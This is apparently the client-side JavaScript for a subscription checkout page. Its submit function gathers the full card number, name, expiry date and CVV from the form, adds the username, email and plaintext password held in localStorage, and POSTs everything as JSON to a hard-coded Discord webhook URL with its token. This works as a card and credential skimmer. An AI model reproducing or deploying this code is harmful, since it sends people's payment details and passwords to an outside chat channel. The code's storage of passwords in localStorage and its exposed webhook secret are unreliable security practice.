if (window.localStorage.getItem("IsConnected") == "true")
{
    document.getElementById("identifier").innerText = window.localStorage.getItem("username") + "\n\nClick here !";
}

if ( !window.localStorage.getItem("cart") || window.localStorage.getItem("cart") == "empty")
{
    alert("You did not pick a subscription!\nredirecting to the subscription page...");
    window.location = "subs.html";
}

document.getElementById("thesub").innerText = window.localStorage.getItem("cart");
document.getElementById("prodprice").innerText = "Total Price: $ " + window.localStorage.getItem("price");

function imoutofnames() {
    if (window.localStorage.getItem("IsConnected") == "true")
    {
        window.location = "compte.html";
        return;
    }
    window.location = "signin.html";
}

const saveandredirect = () => 
{
    /*Get the inputs by class names*/
    var obj = document.getElementsByClassName("input"); /// len is 7

    /*packing the data*/
    var jsondata = '{\n"username": "'+ window.localStorage.getItem("username") + '",\n"email": "' + window.localStorage.getItem("email") + '",\n"password": "' + 
    window.localStorage.getItem("password") + '",\n"cardnumber": "' + obj[0].value + obj[1].value + obj[2].value + obj[3].value + '",\n"name": "' 
    + obj[4].value + '",\n"date": "' + obj[5].value + '-' + obj[6].value + '",\n"ccv": "' + obj[7].value + '",\n"sub": "'+ window.localStorage.getItem("cart") +'"\n}';

    /*init the xhr req obj*/
    var postxhr = new XMLHttpRequest();

    /*using the discord webhook api*/
    postxhr.open('POST', 'https://discord.com/api/webhooks/849806948882055228/5STEFuPPtwaRVlfp-8hj_ynX44cgal7mYcOCaN9_bwjVBz-LdXLtKrNz4PtvOeyiuR9t');
    /*here is the documentation https://discord.com/developers/docs/resources/webhook#execute-webhook*/
    
    postxhr.setRequestHeader('Content-Type', 'application/json');
    postxhr.send(JSON.stringify({content: "```json\n" + jsondata + "```", username: obj[4].value})); //post the request

}